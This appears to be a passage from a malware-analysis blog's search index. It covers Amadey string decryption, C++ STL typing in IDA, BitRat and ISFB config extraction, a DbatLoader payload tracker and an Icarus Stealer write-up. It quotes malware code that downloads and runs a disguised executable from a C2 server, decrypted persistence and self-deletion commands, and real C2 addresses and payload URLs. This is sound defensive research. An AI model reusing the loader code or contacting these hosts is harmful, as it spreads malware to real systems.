            "content": "Overview . Sample . SHA256 18A38FA6F5B306243D99621556AF948A61DAED29619AB755E25010F9E254C6BD . PDB (lol) D: Mktmp Amadey Release Amadey.pdb . References . LockBit 3.0 Being Distributed via Amadey Bot | SmokeLoader Malware Used to Augment Amadey Infostealer | Analyzing Amadey ‚Äì a simple native malware | . TODO / Future Work . Since there are usually going to be global strings in CPP maybe it would be worth writing a small script to label all the global string addresses? . iterate _PVFV (what I call the constructor Vtable lololol so wrong) | for each fn if there is a string assign | assume the args are int he same position (or maybe try hexrays helper fns) | grab the char* string and label the global str::string object and set the type | . Analysis . String Decryption . strings look like base64 | string transform | . import base64 str_hash_data = &#39;d6052c4fe86a6346964a6bbbe2423e20&#39; str_data = &#39;QOqdDVR RQLzIo==&#39; str_data = &#39;XWaNMGOS1BI18fCg iKD7361gd2jM6MP0zCp3pKDfZscLU2oaCO0UYKP2NUcPIEkeSqV5IODXjAtUI==&#39; str_alphabet = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 &#39; str_hash = &#39;&#39; for i in range(len(str_data)): str_hash += str_hash_data[i % len(str_hash_data)] out = &#39;&#39; for i in range(len(str_data)): if str_data[i] not in str_alphabet: out += str_data[i] continue alphabet_count = str_alphabet.find(str_data[i]) hash_count = str_alphabet.find(str_hash[i]) index_calc = (alphabet_count + len(str_alphabet) - hash_count) % len(str_alphabet) out += str_alphabet[index_calc] base64.b64decode(out) . b&#39;SYSTEM CurrentControlSet Control ComputerName ComputerName&#39; . def decrypt(str_data, str_hash_data, str_alphabet): str_hash = &#39;&#39; for i in range(len(str_data)): str_hash += str_hash_data[i % len(str_hash_data)] out = &#39;&#39; for i in range(len(str_data)): if str_data[i] not in str_alphabet: out += str_data[i] continue alphabet_count = str_alphabet.find(str_data[i]) hash_count = str_alphabet.find(str_hash[i]) index_calc = (alphabet_count + len(str_alphabet) - hash_count) % len(str_alphabet) out += str_alphabet[index_calc] return base64.b64decode(out) decrypt(&#39;1RydQIOr3Zcp6emn RYv8IGzgUKS6r5ThSdqDVBERAP2Ir 0JQ1=&#39;, str_hash_data, str_alphabet) . b&#39;abcdefghijklmnopqrstuvwxyz0123456789-_&#39; . import re str_hash_data = &#39;d6052c4fe86a6346964a6bbbe2423e20&#39; str_alphabet = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 &#39; def is_ascii(s): return all(c &lt; 128 or c == 0 for c in s) file_data = open(&#39;/tmp/amadey.bin&#39;,&#39;rb&#39;).read() strings = [] for m in re.finditer(rb&#39;[a-zA-Z =0-9]{4,}&#39;,file_data): strings.append(m.group().decode(&#39;utf-8&#39;)) for s in strings: try: temp = decrypt(s, str_hash_data, str_alphabet) if is_ascii(temp) and len(temp) &gt; 3: print(temp.decode(&#39;utf-8&#39;)) except: continue . 193.56.146.243 /h8V2cQlbd3/index.php 3.50 50c1695437 rovwer.exe SCHTASKS /Create /SC MINUTE /MO 1 /TN /TR &#34; &#34; /F SOFTWARE Microsoft Windows CurrentVersion RunOnce SOFTWARE Microsoft Windows CurrentVersion Explorer User Shell Folders Startup cmd /C RMDIR /s/q SOFTWARE Microsoft Windows CurrentVersion Run rundll32 /Delete /TN &#34; Programs SOFTWARE Microsoft Windows CurrentVersion Explorer Shell Folders %USERPROFILE% App POST &amp;vs= &amp;sd= &amp;os= &amp;bi= &amp;ar= &amp;pc= &amp;un= &amp;dm= &amp;av= &amp;lv= &amp;og= cred.dll| Main http:// https:// Plugins/ &amp;unit= shell32.dll kernel32.dll GetNativeSystemInfo ProgramData AVAST Software Avira Kaspersky Lab ESET Panda Security Doctor Web 360TotalSecurity Bitdefender Norton Sophos Comodo WinDefender 0123456789 Content-Type: multipart/form-data; boundary=- Content-Disposition: form-data; name=&#34;data&#34;; filename=&#34; &#34; Content-Type: application/octet-stream -- ?scr=1 .jpg Content-Type: application/x-www-form-urlencoded SYSTEM CurrentControlSet Control ComputerName ComputerName ComputerName abcdefghijklmnopqrstuvwxyz0123456789-_ -unicode- SYSTEM CurrentControlSet Control UnitedVideo CONTROL VIDEO SYSTEM ControlSet001 Services BasicDisplay Video VideoID 0000 DefaultSettings.XResolution DefaultSettings.YResolution SOFTWARE Microsoft Windows NT CurrentVersion ProductName 2019 2022 2016 CurrentBuild echo Y|CACLS &#34; &#34; /P &#34; CACLS &#34; :R&#34; /E :F&#34; /E &amp;&amp;Exit rundll32.exe &#34;taskkill /f /im &#34; &#34; &amp;&amp; timeout 1 &amp;&amp; del &amp;&amp; Exit&#34; &#34; &amp;&amp; ren &amp;&amp; Powershell.exe -executionpolicy remotesigned -File &#34; . hashes= [&#39;d6052c4fe86a6346964a6bbbe2423e20&#39;, &#39;bf045808586a2473c5a7441da6f3bfa9&#39;, &#39;bc4cb0&#39;, &#39;b6fd4be15536ff986cddb445cb644cf8&#39;] .",
            "url": "https://research.openanalysis.net/cpp/stl/amadey/loader/config/2022/11/13/amadey.html",
            "relUrl": "/cpp/stl/amadey/loader/config/2022/11/13/amadey.html",
            "date": " ‚Ä¢ Nov 13, 2022"
        }
        
    
  
    
        ,"post32": {
            "title": "C++ STL Types",
            "content": "Overview . We need a repeatable method to identify and markup the visual c++ types. . References . STD:String size/struct layout | Why is sizeof(string) == 32? (stack overflow) | STL_DECOMPILE_GUIDE x86 | OALABS stream dealing with STL types | empty_msvc | Holy Bible of MSVC types | pyflirt for creating new FLIRT sigs | . Rolf STL Types Script . Rolf has a nice IDA script that will add some STL structs to IDA for us STLTypes-ForDistribution.py. To use the script simply run it in IDA, then use MakeListTypes(DWORD) in the Python CLI to define the structs. Once the structs are defined you still need to manually apply them to the types. . ** In the end it may be that we should be doing this dynamically anyway (from the man who would know) Automation Techniques in C++ Reverse Engineering . HexRaysPyTools (Mishap fork) . There is also a modified version of the HexRaysPyTools plugin for IDA that can be used to apply some STL types HexRaysPyTools. . Our Approach . We are going to use a contrived example but hopefully create a repeatable process. . Example. 9c7fa766649f100e7d2f17f1415782908182e719dd90abf37e69039088f052b6 malshare . Identify the MSVC version . Appearently the STL type definitions change based on the version of MSVC that is used. To make sure are applying the correct types we need to first make sure we have the right version. . Assumptions . We can use Detect it Easy DiE to figure out the version. | We might be able to improve on the DiE signature and make some standalone sigs. | . A Working Approach . Die (and many other PE analysis tools) simply read the PE rich header info and extract the version information form this. We can read the rich header info as good as anyone, let&#39;s just do this directly. . WARNING This approach relies on the rich header info of the PE both being intact and being correct (unmodified). If the header info is mangled or modified we cannot use this approach. In these cases it may be necissary to try something more dynamic? . Compiler/Liker References . Die info Microsoft Visual Studio.4.sg | A list of versions on github dishather/richprint | The supposed best one is from PEStudio If we just want to references directly they are in the bundled rich-header.xml file | . | . Example . From PEStudio: Utc1900_CPP,Visual Studio 2015 - 14.0,24 - this is C++ 14. . Import the correct type structs into IDA . Translating the type definitions into structs does not seem trivial! It&#39;s template madeness! We do have the type definitions for STL Microsoft STL but we need some way to parse them and we need some way to differentiate between versions. . A Working Approach . This is where the Holy Bible of MSVC types comes in. But we still have a parsing/translation problem. . TODO - More Research Needed We need a tool/process to &quot;compile&quot; the template defs into structs keeping intact all variations of the template. I&#39;m not sure if this is possible, or if something like this exists currently? For now we are doing this manually, NOT IDEAL! . One idea might be to compile dummy files and import the pdb to get the type info? | . Example . We have located the def for the string type for our compiler version 14.0,24 std::string. This def is the same as the one we have already defined in the fork of HexRaysPyTools but this was done manually (not ideal). . Locate the type helper functions . Assumptions . If we compile a &quot;dummy&quot; PE with a bunch of STL types, and no opimization we might be able to use BinDiff to ID some of the helper functions. At a minimum we can use the PDB to import the correct struct definitions. My assumption is that even though the target will be optimized (destorying many of the helper functions) we only need one good one to ID the argument types and we can propogate them backwards once we identify one! | . | We can use the existing FLIRT sigs (built into IDA) and maybe create our own (or steal some from github) but this is again at the mercy of compiler optimization. WE have noticed that when IDA identifies these functions the function prototype is incorrect because they do not have the correct STL type defined. | . A Working Approach . Sig approach with FLIRT . There is some limited success with this, the default IDA sigs do pick up some helper functions which can be used to ID and propogate the function types (this is a good start, and free work!). In addition to the built in IDA FLIRT we will also try these sigs from Mandiant siglib. These sigs also seem to have some success in identifying some helper functions for the types which we can use to ID the type (argument) and then propogate that type to the other functions. . Neither of these have a high success rate due to compiler optimization (nor should any signature based method). . Bindiff Approach . This is a complete bust! Optimization causes too much change in the code for us to realistically be able to match much (some FPs etc.) . TODO This seems like an unsolved problem currently. The best we can do is some signature matching... maybe we could build a big enough signature db? We need to research other approaches that have/haven&#39;t been tried. . Apply the types in IDA . Assumptions . We can either apply these directly if our &quot;helper function&quot; identification process works or | We can try the shape identification from the forked HexRaysPyTools to automatically identify known types | . A Working Approach . Use the helper functions that we have identified in the previous steps to locate variables (arguments) that we know the type of | Apply the type to these variables | &quot;Back-propogate&quot; the type information for each identified variable (this is somewhat automated by the fork of HexRaysPyTools). | Future Research . If the PE rich header is missing or mangled what other ways can we use to identify the MSVC version? | We need a tool/process to &quot;compile&quot; the template defs into structs that can be imported into IDA One approach might be to use PDB files from dummy compiled PEs | . | When attempting to locate helper functions using FLIRT sigs we are limited due to compiler optimization, could we build a FLIRT db big enough to handle all optimiztion paths? Is it realistic, how much is inlined and can&#39;t be sigged? | .",
            "url": "https://research.openanalysis.net/cpp/stl/types/tooling/2022/11/06/cpp_stl.html",
            "relUrl": "/cpp/stl/types/tooling/2022/11/06/cpp_stl.html",
            "date": " ‚Ä¢ Nov 6, 2022"
        }
        
    
  
    
        ,"post33": {
            "title": "BitRat Exposed",
            "content": "Overview . Samples . Packed 5e1ea26f5575e26857b209695de82207a04de0b0dc06f3645f776cc628440c46 Malware Bazaar . Unpacked 91e994fe2f5d97c9c7a8267ac900bd08d66c6e997397d01ccd15c0b301d98ea3 Malshare . Overview . Malpedia BitRat Links | BitRAT ‚Äì The Latest in C++ Malware Written by Incompetent Developers | APT-C-36 Updates Its Spam Campaign Against South American Entities With Commodity RATs | . Some notes from the Krabs blog... . Reference sample 7faef4d80d1100c3a233548473d4dd7d5bb570dd83e8d6e5faff509d6726baf2 | C++ | Statically linked Boost, and libCURL etc. | String encryption using methods based on LeFF‚Äôs constexpr | The config is encrypted using Camellia | . Analysis . This is a C++ beast and we don&#39;t have nice STD::String types, we are going to try this modified hexrayspytools plugin (broken for IDA 7.5 lol) . Also there is a nice ref. for STD:String size/struct layout here CPP Strings. Also a nice stackoverflow post (lol) on strings Why is sizeof(string) == 32? . For C++ Strings there is also this nice reference STL_DECOMPILE_GUIDE x86 . std::string . The following is a handy struct to have for IDA . #pragma pack(push, 1) struct stdstring { union { char *pstr; char lstr[16]; }; DWORD size; DWORD max; }; #pragma pack(pop) . Config Extraction . Old Version . from malduck import camellia import zlib data = bytes.fromhex(&#39;68ac9b8a92005de3a7fe840ad07ec9adf84ed732c4c6a19ee2f205cdbda82b9a4a05ae3d416a39aaf5c598d75bf6c0de00450603400f480879941df9ad9f61f01959d98df31f748e8761d8aa79552c751e208a939d58edf6af7d7215412144355d9dbc1b71567ac895b3fecd3552050b0d1ac6698cf6e43d605f5cabec11853cdd7aa26dfeed45878d12c16eb95cf0805135fb2abab8632e918df7b192946e5d&#39;) key = b&#39;ac4016133b9d18e2&#39; iv = b&#39; x00&#39;*16 camellia.cbc.decrypt(key, iv, data) . b&#39;khw3lix3kcivpsmlgglqao2ntut5gmp2ydmvnn5leduil554po5n2wad.onion|0|80|0c9c6aaa257aced0|Xauth|auth.exe|b43e92f859a4b4e81c5c7768339be3e7|Runtime Broker| x0c x0c x0c x0c x0c x0c x0c x0c x0c x0c x0c x0c&#39; . New Version . stack_data = b&#39;U=4d6Nmd=U&#39; out = [] for c in stack_data: out.append((0x25 * (c - 8) % 0x7F + 0x7F) % 0x7F) key_pad = bytes(out) key_pad . b&#39;78hf326f87&#39; . import zlib import hashlib key = b&#39;345a557a536d4372&#39; data = bytes.fromhex(&#39;3b66f71111cc5d17f0df570bf2b989e5ce5a01aa36d2197cf04df6e01a7daac209be5528c070b9bd349adc0499c7baa5e67da97f47246fb64fd8b43d7f1e169446f59a213f68f035c05006e6602a60e1078cc74bc20476a02fd68df0e9f14af8&#39;) key += key_pad print(f&quot;key bytes: {key}&quot;) # crc32 of key (add 8) key_crc32 = (zlib.crc32(key) &amp; 0xffffffff) + 8 print(f&quot;key crc32: {hex(key_crc32)}&quot;) # convert crc32 to string crc32_string = format(key_crc32, &#39;#04x&#39;)[2:].lower() print(crc32_string) # md5 and truncate to 16 bytes key = hashlib.md5(crc32_string.encode(&#39;utf-8&#39;)).hexdigest()[:16] print(key) # decrypt camellia cbc iv = b&#39; x00&#39;*16 camellia.cbc.decrypt(key.encode(&#39;utf-8&#39;), iv, data) . key bytes: b&#39;345a557a536d437278hf326f87&#39; key crc32: 0x16df767c 16df767c cd3f61fc872fb2c5 . b&#39;103.125.190.185|1234|0|b008202b03e10e9c|0|0|827ccb0eea8a706c4c34a16891f84e7b|tor| x0f x0f x0f x0f x0f x0f x0f x0f x0f x0f x0f x0f x0f x0f x0f&#39; .",
            "url": "https://research.openanalysis.net/bitrat/rat/config/cpp/2022/10/20/bitrat.html",
            "relUrl": "/bitrat/rat/config/cpp/2022/10/20/bitrat.html",
            "date": " ‚Ä¢ Oct 20, 2022"
        }
        
    
  
    
        ,"post34": {
            "title": "Threat Intel - Building A Simple Botnet Tracker",
            "content": ". Overview . This is a very simplified overview of the cyber threat intelligence production cycle and consumers. It is only meant to inform the most casual of reader as to why we reverse engineer malware. . Corporate Security . In a mature corporate security program there needs to be a way for the program to track success, and plan for the future. This is where threat intel plays the largest role. The threat intel product can both provide a picture of the current and emerging threats faced by an organization, as well as provide operational support for their security controls (data feeds for blocklists etc.) . . Corporate Consumption of The Intel Product . The corporate value proposition for threat intel is simple; we give you a picture of the threats you face and how they operate so you can protect yourself. In practice the intel product itself takes many forms each oriented towards a different consumer within the organization. . . Intel Production Process . The threat intel production process can be visualized as a funnel with raw data consumed at the opening of the funnel and finished intel product produced at the narrow end. In practice the customer requirements usually drive the finished intelligence product while the internal intel process may drive the raw data collection. . Finished Intelligence . With each step in the in intelligence production pipeline the information is refined and enriched to provide a more informed and compelling picture of the current threat landscape. Technical reports produced by reverse engineers at the technical analysis layer may be producing product that is complete enough to be directly consumed by technical functions within the customer organization.Intelligence analysts sit at the narrow end of the intelligence funnel and are not necessarily technical. The final product from an intelligence analyst can often by summarized for briefing at the C-level of the customer organization. . Operational Intelligence . With the emergence of the detection engineering role (both within the customer organization as well as within the intel production pipeline) there is also a secondary funnel. The primary role of the detection engineer within the intel pipeline is to produce raw intelligence (one step above data) that can be machine consumable for security controls (rules, IOCs, etc.) The primary role of the detection engineer within the customer organization is to consume this raw intelligence and ensure it is fed into their security controls. This hybrid role forms a synergy (cringe) between the intel production pipeline and the security controls products (EDR, FIREWALL, etc.) Sometimes this secondary funnel is referred to as operational intelligence. . . Simple DbatLoader Tracker . Our tracker will be responsible for pulling down the payloads deployed by dbatloader. Each loader sample contains a download URL which can be used to download a unique (I think?) payload. The payloads are encrypted with a simple format that we reverse engineered on a past stream. . The Tracker Architecture . Use the UnpacMe feed to pull all new dbatloader ULRs | Download the payloads | Decrypt them and ??? | . TODO . import os api_key = os.environ.get(&#39;API_KEY&#39;) . import requests import hashlib . sample_id = &#39;c37e0dc8-934f-4f61-b3c9-9cdbc4ca6be5&#39; def get_c2_from_sample(sample_id): url = f&quot;https://api.unpac.me/api/v1/private/results/{sample_id}&quot; headers = {&quot;Authorization&quot;:api_key} response = requests.get(url, headers=headers) response_json = response.json() c2s = [] for result in response_json.get(&#39;results&#39;,[]): if &#39;config&#39; in result: config = result.get(&#39;config&#39;,{}).get(&#39;config&#39;,{}) for c2 in config.get(&#39;c2s&#39;,[]): if c2.get(&#39;type&#39;,None) == &#39;url&#39;: url = c2.get(&#39;value&#39;,None) if url is not None: c2s.append(url) return list(set(c2s)) get_c2_from_sample(sample_id) . [&#39;https://onedrive.live.com/download?cid=EE3CB851BBF42204&amp;resid=EE3CB851BBF42204%21117&amp;authkey=AP6g5cIxaUzrxIM &#39;] . def get_c2s_from_feed(): c2s = [] url = &#39;https://api.unpac.me/api/v1/private/feed/unpacked/yara/DbatLoaderStage1&#39; headers = {&quot;Authorization&quot;:api_key} response = requests.get(url, headers=headers) response_json = response.json() configs = [] for sample in response_json.get(&#39;submissions&#39;,[]): if sample.get(&#39;configs&#39;,False): # Get the config sample_sha256 = sample.get(&#39;submission_sha256&#39;,None) sample_id = sample.get(&#39;id&#39;,None) if sample_id is not None: for c2 in get_c2_from_sample(sample_id): yield sample_sha256,c2 list(get_c2s_from_feed()) . [(&#39;e57273b7f448b8713bd164d86bfd24a01570a4f5902e09fd07d6df7088458cd1&#39;, &#39;https://onedrive.live.com/download?cid=B9FA79B0FDF4BC7C&amp;resid=B9FA79B0FDF4BC7C%21125&amp;authkey=ACsEbxwfEBMdCD&#39;), (&#39;4e72f9068a19d1b59183b5a9a2e8ccedd5b2165fc523828002f8a584d3cada49&#39;, &#39;https://onedrive.live.com/download?cid=EE3CB851BBF42204&amp;resid=EE3CB851BBF42204%21117&amp;authkey=AP6g5cIxaUzrxIM &#39;)] . c2 = &#39;https://onedrive.live.com/download?cid=EE3CB851BBF42204&amp;resid=EE3CB851BBF42204%21117&amp;authkey=AP6g5cIxaUzrxIM&#39; def get_payload(c2): out_data = None headers = {&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.34&#39;} response = requests.get(c2, headers=headers) if response.ok: out_data = response.content return out_data . def decrypt_payload(data, key, delim): out = [] for c in data: if c &amp; 1 != 0: out.append((c + key) &amp; 0xff) else: out.append((c - key) &amp; 0xff) out = bytes(out) out = out[::-1] return out.split(delim) . def addit(data, key): out = [] for c in data: out.append((c + (0x112 % key))&amp;0xff) return bytes(out) def decrypt_yak(data): &quot;&quot;&quot; implements the first decryption layer of function 0x416408 &quot;&quot;&quot; res = bytearray(data) for i, c in enumerate(data): if 0x21 &lt;= c &lt;= 0x7e: res[i] = ((((c + 0xe) % 0x5e) + 0x21) &amp; 0xff) return bytes(res) def decrypt_payload_section(section_data, main_key, section_key): out = [] key_len = len(section_key) section_data_len = len(section_data) key_count = 0 for i in range(section_data_len): tmp_byte = (section_data[i] ^ section_data_len ) &amp; 0xff out.append((section_key[key_count] ^ key_len ^ tmp_byte ) &amp; 0xff) key_count = (key_count + 1) % key_len payload_out = bytes(out) payload_out_dec = addit(payload_out, main_key) payload_out_dec = payload_out_dec[::-1] return decrypt_yak(payload_out_dec) def decrypt_download(data, key, delim): out_sections = decrypt_payload(data, key, delim) if len(out_sections) &lt;= 4: print(&quot;Not enough sections decrypted&quot;) return None section_key = out_sections[1] section_data = out_sections[3] return decrypt_payload_section(section_data, key, section_key) key = 217 delim = b&#39;*()%@5YT!@#G__T@#$%^&amp;*()__#@$#57$#!@&#39; out_dir = &#39;/tmp&#39; for sample_sha256,c2 in get_c2s_from_feed(): # Lol fix url format c2 = c2.strip(&quot; &quot;) print(f&quot;Downloading payload for {sample_sha256}&quot;) print(f&quot; tURL: {c2}&quot;) payload = get_payload(c2) if payload is None: print(&quot; tURL is dead&quot;) continue if payload.find(b&#39;&lt;/html&gt;&#39;) != -1: print(&quot; tPayload removed&quot;) continue final_payload = decrypt_download(payload, key, delim) payload_hash = hashlib.sha256(final_payload).hexdigest() payload_path = f&quot;{out_dir}/{payload_hash}.bin&quot; print(f&quot; tDropping pyload to {payload_path}&quot;) with open(payload_path,&#39;wb&#39;) as fp: fp.write(final_payload) . Downloading payload for 4e72f9068a19d1b59183b5a9a2e8ccedd5b2165fc523828002f8a584d3cada49 URL: https://onedrive.live.com/download?cid=EE3CB851BBF42204&amp;resid=EE3CB851BBF42204%21117&amp;authkey=AP6g5cIxaUzrxIM Dropping pyload to /tmp/7f4006b1553a899a9fe253c57e97418251d81bb98afd68683bb9c35fcf611e8e.bin .",
            "url": "https://research.openanalysis.net/threatintel/botnet/tracker/automation/python/dbatloader/2022/10/13/threat_intel_simple_bot_tracker.html",
            "relUrl": "/threatintel/botnet/tracker/automation/python/dbatloader/2022/10/13/threat_intel_simple_bot_tracker.html",
            "date": " ‚Ä¢ Oct 13, 2022"
        }
        
    
  
    
        ,"post35": {
            "title": "Icarus Stealer - What is it?",
            "content": ". Overview . Samples . 8e88de63c132f964891dd00501bee5078f27dfcec7ca122f19bd43f9ed933427 Malware Bazaar . References . Malware Sellix link | Karsten twitter ref | They have a tutorial video! video | . Analysis . C2 . The URLs are base64 encoded and link back to the c2 server. In this case the url links to a .jpg file which is infact a base64 endcoded PE. . private static void StopRootkit() { WebClient webClient = new WebClient(); Stream stream = webClient.OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String(&quot;aHR0cDovLzE5My4zMS4xMTYuMjM5L2NyeXB0L3B1YmxpYy9VcGRhdGVfRG93bmxvYWRzL3JlbW92ZS5qcGc=&quot;))); StreamReader streamReader = new StreamReader(stream); string s = streamReader.ReadToEnd(); byte[] bytes = Convert.FromBase64String(s); File.WriteAllBytes(Path.GetTempPath() + &quot; rkd.exe&quot;, bytes); Process.Start(Path.GetTempPath() + &quot; rkd.exe&quot;); File.Delete(Path.GetTempPath() + &quot; rkd.exe&quot;); } . C2 URLs . aHR0cDovLzE5My4zMS4xMTYuMjM5L2NyeXB0L3B1YmxpYy9VcGRhdGVfRG93bmxvYWRzL3JlbW92ZS5qcGc= -&gt; http://193.31.116.239/crypt/public/Update_Downloads/remove.jpg | aHR0cDovLzE5My4zMS4xMTYuMjM5L2NyeXB0L3B1YmxpYy9VcGRhdGVfRG93bmxvYWRzL3J0LmpwZw== -&gt; http://193.31.116.239/crypt/public/Update_Downloads/rt.jpg There are more... | . Downloaded Modules . remove.jpg . Deletes the rootkit . public static void remove() { try { bool[] array = new bool[2]; array[0] = true; foreach (bool flag in array) { using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, flag ? RegistryView.Registry64 : RegistryView.Registry32).OpenSubKey(&quot;SOFTWARE Microsoft Windows NT CurrentVersion Windows&quot;, true)) { bool flag2 = (registryKey.GetValue(&quot;AppInit_DLLs&quot;, &quot;&quot;) as string).Contains(&quot;r77-&quot;); if (flag2) { registryKey.SetValue(&quot;AppInit_DLLs&quot;, &quot;&quot;); } } } } catch (Exception ex) { } } . rt.jpg . This is a simple startup function for an open source userland rootkit that can be found on GitHub r77-rootkit. . Server Misconfiguration . It&#39;s almost like the developer knows they made some mistakes... . Laravel Debugger Exposed . A typo in one of the C2 URLs exposed a server error with a full stack trace. This revealed that the developer was uing the laravel PHP framework and had left the debugger publically exposed. . Open Directory . The stack trace led to the discovery that the server root had been configured as an open directory with many files publicly served to the Internet including logs. . Analysis Stopped: . There are more files and download links that could be investigated but the malware is so simple and the server configured so poorly we stopped our analysis. This malware looks more like a hobby project than a professional business... .",
            "url": "https://research.openanalysis.net/icarus/yara/config/dotnet/2022/10/09/icarus.html",
            "relUrl": "/icarus/yara/config/dotnet/2022/10/09/icarus.html",
            "date": " ‚Ä¢ Oct 9, 2022"
        }
        
    
  
    
        ,"post36": {
            "title": "ISFB / GOZI / RM3 Config Extraction",
            "content": "Overview . Sample . Sha256: 33D6C2BF629E34D4F11F3C680A3EF60501769DBDAC658E3A4A119D5AC81BFF79 MalwareBazaar . References . Sysopfb &lt;3 github extractor | 0ver-fl0w ISFB Tools | RM3 ‚Äì Curiosities of the wildest banking malware | . Config Extractor . import pefile import struct import malduck FILE_PATH = &#39;/tmp/33d6c2bf629e34d4f11f3c680a3ef60501769dbdac658e3a4a119d5ac81bff79.bin&#39; file_data = open(FILE_PATH, &#39;rb&#39;).read() def is_ascii(s): return all(c &lt; 128 or c == 0 for c in s) def get_config_entry(data, ptr): # Read the marker WORD marker = None marker_data = data[ptr:ptr + 2] if is_ascii(marker_data): marker = marker_data.decode(&#39;utf-8&#39;) ptr += 2 # Skip the remaining header ptr += 6 # Read hash value hash_value = struct.unpack(&quot;&lt;I&quot;,data[ptr:ptr+4])[0] ptr += 4 # Read config RVA rva = struct.unpack(&quot;&lt;I&quot;,data[ptr:ptr+4])[0] ptr += 4 # Read the config size size = struct.unpack(&quot;&lt;I&quot;,data[ptr:ptr+4])[0] ptr +=4 return {&quot;marker&quot;:marker,&quot;hash_value&quot;:hash_value,&quot;rva&quot;:rva,&quot;size&quot;:size}, ptr def get_config_entries(data, ptr): config_entries = [] config_entry,ptr = get_config_entry(data, ptr) config_entries.append(config_entry) while data[ptr] != 0: config_entry,ptr = get_config_entry(data, ptr) config_entries.append(config_entry) return config_entries def get_section_table_end(pe): end_of_last_section = None if pe.FILE_HEADER.Machine == 0x014c: #32bit image_section_header_size = 0x28 #image_section_header = image_dos_header.e_lfanew + sizeof(c_uint) + sizeof(IMAGE_FILE_HEADER) + x * sizeof(IMAGE_SECTION_HEADER) + image_nt_headers.FileHeader.SizeOfOptionalHeader end_of_last_section = pe.NT_HEADERS.FILE_HEADER.SizeOfOptionalHeader + pe.DOS_HEADER.e_lfanew + 4 + image_section_header_size * pe.FILE_HEADER.NumberOfSections elif pe.FILE_HEADER.Machine == 0x8664: #64bit image_section_header_size = 0x28 end_of_last_section = pe.NT_HEADERS.FILE_HEADER.SizeOfOptionalHeader + pe.DOS_HEADER.e_lfanew + 24 + image_section_header_size * pe.FILE_HEADER.NumberOfSections return end_of_last_section def config_table_scan(data, scan_start, scan_end): ptr = scan_start while ptr &lt; scan_end: if data[ptr] != 0: break ptr += 1 if ptr == scan_end: ptr = None return ptr def get_config_data(data, ptr, size): return data[ptr:ptr+size] def config_wordlist_handler(config_data): ptxt_data = malduck.aplib.decompress(config_data) hash_value = struct.unpack(&#39;&lt;I&#39;,ptxt_data[:4])[0] wordlist = ptxt_data[4:].decode(&#39;utf-8&#39;) return {&quot;type_hash&quot;:hash_value, &quot;wordlist&quot;:wordlist.strip(&#39; r n&#39;).split(&#39; r n&#39;)} def config_crc_client_ini_handler(config_data): ptxt_data = malduck.aplib.decompress(config_data) entry_data = [] for entry in ptxt_data.split(b&quot; x00&quot;): if len(entry) &gt; 1: if is_ascii(entry): entry_data.append(entry.decode(&#39;utf-8&#39;)) c2_data = max(entry_data, key=len) return c2_data.split(&#39; &#39;) pe = pefile.PE(data=file_data) ptr_section_table_end = get_section_table_end(pe) assert ptr_section_table_end is not None ptr_config_table = config_table_scan(file_data, ptr_section_table_end + 1, pe.sections[0].PointerToRawData) assert ptr_config_table is not None # Determine the ISFB version based on the marker marker_versions = {&quot;FJ&quot;:&quot;old_isfb&quot;, &quot;J1&quot;:&quot;old_isfb&quot;, &quot;J2&quot;:&quot;dreambot&quot;, &quot;J3&quot;:&quot;isfb_v3_japan&quot;, &quot;JJ&quot;:&quot;isfb_v2.14+&quot;, &quot;WD&quot;:&quot;RM3&quot; } marker = file_data[ptr_config_table:ptr_config_table+2].decode(&#39;utf-8&#39;) print(f&quot;Bot version: {marker_versions.get(marker,&#39;Unknown&#39;)}&quot;) # Currently we can&#39;t handle the new RM3 config entry structure assert marker != &quot;WD&quot; config_entries = get_config_entries(file_data, ptr_config_table) assert len(config_entries) != 0 # Loop through configs and handle each type for config_entry in config_entries: config_type_hash = config_entry.get(&quot;hash_value&quot;) config_rva = config_entry.get(&quot;rva&quot;) config_offset = pe.get_offset_from_rva(config_rva) assert config_offset &lt; len(file_data) config_size = config_entry.get(&quot;size&quot;) assert config_size &lt; 0x1000 # Get config data config_data = get_config_data(file_data, config_offset, config_size) # Get config type handler if config_type_hash == 0xe1285e64: # CRC_PUBLIC_KEY print(f&quot;CRC_PUBLIC_KEY at offset {hex(config_offset)}&quot;) elif config_type_hash in [0x8fb1dde1, 0xd722afcb]: # CRC_CLIENT_INI print(f&quot;CRC_CLIENT_INI at offset {hex(config_offset)}&quot;) c2_list = config_crc_client_ini_handler(config_data) print(&quot;C2 List&quot;) for c2 in c2_list: print(f&quot; t{c2}&quot;) elif config_type_hash == 0x7a042a8a: # CRC_INSTALL_INI print(f&quot;CRC_INSTALL_INI at offset {hex(config_offset)}&quot;) elif config_type_hash == 0x90f8aab4: # CRC_CLIENT64 print(f&quot;CRC_CLIENT64 at offset {hex(config_offset)}&quot;) elif config_type_hash in [0xda57d71a, 0x68ebb983]: # CRC_WORDLIST print(f&quot;CRC_WORDLIST at offset {hex(config_offset)}&quot;) wordlist_data = config_wordlist_handler(config_data) print(wordlist_data) else: print(f&quot;Unhandled config type {hex(config_type_hash)}&quot;) . Bot version: isfb_v2.14+ CRC_PUBLIC_KEY at offset 0x38800 CRC_CLIENT_INI at offset 0x38a00 C2 List trackingg-protectioon.cdn1.mozilla.net 45.8.158.104 trackingg-protectioon.cdn1.mozilla.net 188.127.224.114 weiqeqwns.com wdeiqeqwns.com weiqeqwens.com weiqewqwns.com iujdhsndjfks.com CRC_WORDLIST at offset 0x38c00 {&#39;type_hash&#39;: 3014533032, &#39;wordlist&#39;: [&#39;list&#39;, &#39;stop&#39;, &#39;computer&#39;, &#39;desktop&#39;, &#39;system&#39;, &#39;service&#39;, &#39;start&#39;, &#39;game&#39;, &#39;stop&#39;, &#39;operation&#39;, &#39;black&#39;, &#39;line&#39;, &#39;white&#39;, &#39;mode&#39;, &#39;link&#39;, &#39;urls&#39;, &#39;text&#39;, &#39;name&#39;, &#39;document&#39;, &#39;type&#39;, &#39;folder&#39;, &#39;mouse&#39;, &#39;file&#39;, &#39;paper&#39;, &#39;mark&#39;, &#39;check&#39;, &#39;mask&#39;, &#39;level&#39;, &#39;memory&#39;, &#39;chip&#39;, &#39;time&#39;, &#39;reply&#39;, &#39;date&#39;, 